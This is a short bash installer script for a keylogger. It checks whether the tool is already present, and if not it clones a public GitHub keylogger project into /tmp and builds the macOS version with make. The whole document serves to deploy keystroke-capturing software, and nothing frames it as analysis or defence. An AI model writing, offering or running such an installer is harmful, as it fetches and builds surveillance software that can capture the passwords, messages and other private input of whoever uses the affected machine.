#!/bin/bash

# https://github.com/GiacomoLaw/Keylogger

echo "Run keylogger Installer"

# check if exist using `which`

which keylogger >/dev/null 2>&1

if [ $? -eq 0 ]; then
	echo "keylogger already installed"
	exit 0
fi

echo "keylogger not installed"
echo "Installing keylogger"

git clone https://github.com/GiacomoLaw/Keylogger /tmp/keylogger && cd /tmp/keylogger/mac

make
